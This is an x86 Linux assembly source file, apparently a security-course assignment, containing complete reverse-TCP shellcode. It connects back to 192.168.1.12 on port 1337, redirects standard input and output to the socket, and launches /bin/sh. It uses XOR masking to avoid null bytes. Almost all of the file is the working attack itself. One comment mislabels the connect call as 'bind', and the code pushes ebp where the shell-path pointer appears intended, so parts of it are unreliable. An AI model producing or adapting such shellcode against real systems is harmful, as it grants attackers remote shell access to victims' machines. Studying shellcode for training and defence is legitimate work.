; Filename: shell_reverse_tcp.nasm
; Author:   Stylianos Voukatas
; Website:  https://vostdev.wordpress.com/
;
; Purpose:  Assignment 2 for SLAE
; SLAE:     http://securitytube-training.com/onlinecourses/securitytube-linux-assembly-expert/

; Student ID: PA-27669

global _start			

section .text
_start:

	; set registers	to zero
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	;socket section
	mov ax, 0x167	; set num for socket interrupt
	mov bl, 0x02	; set domain IPv4 Protocol, try also 0x00 for both v4 and v6, also one less instruction
	mov cl, 0x01	; set type
	; edx is zero    ; set protocol, leave it 0 so it will select on its own based on the type

	int 0x80	; interrupt for socket()


	; eax will hold our file descriptor (fd)
	mov esi, eax	; store fd	

; connect section
	
    ; construct the struct sockaddr_in

	; prepare eax for ip addr XOR, set a mask
	mov eax, 0xffffffff
	push edx	; padding 4 bytes
	push edx	; padding 4 bytes

	; address 192.168.1.12 is in little endian 0xc01a8c0
	; we XOR the address using a mask of 0xffffffff and we get 0xf3fe573f
	; in order to restore the initial value we need to XOR again with the mask
	; this is done to avoid null characters in case our ip addr contain 0
	xor eax, 0xf3fe573f 
	push eax	; address field, set to 192.168.1.12, in little endian format 


	; same convertion for the port number
	
	mov eax, 0xffffffff
	xor ax, 0xc6fa	; port number 1337 after mask applied in little endian
	push ax
	push word 0x02	; address family

	mov ecx, esp	; save the struct address in stack

	mov dl, 0x10	; size of struct, 16 bytes (padding + address + port + family)

	mov ebx, esi	; set fd

	xor eax, eax
	mov ax, 0x016a	; set num for bind interrupt

	int 0x80

	; check if connect succeed

	test eax, eax	; if not zero then an error occured
	jnz exit	


	; dup2 section
	xor ecx, ecx
	mov cl, 0x3	; prepare for loop
	xor eax, eax


dup_loop:
			; ebx has the fd from the previous call
			; duplicate fd for stdin, stdout, stderr
	mov al, 0x3f
	
	dec cl
	int 0x80
	
	jnz dup_loop


	; execve section

	xor eax, eax
	
	push eax	; push \0 in stack

	; /bin//sh	
	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp

	push eax	; push 0 in stack
	mov edx, esp

	push ebp	; push the address of /bin//sh in stack

	mov ecx, esp	; put the address of args in ecx


	mov al, 0xb
	int 0x80


exit:

	xor eax, eax
	xor ebx, ebx
	mov al, 0x01
	mov bl, 0x07	; just a random number as an exit code :)
	
	int 0x80


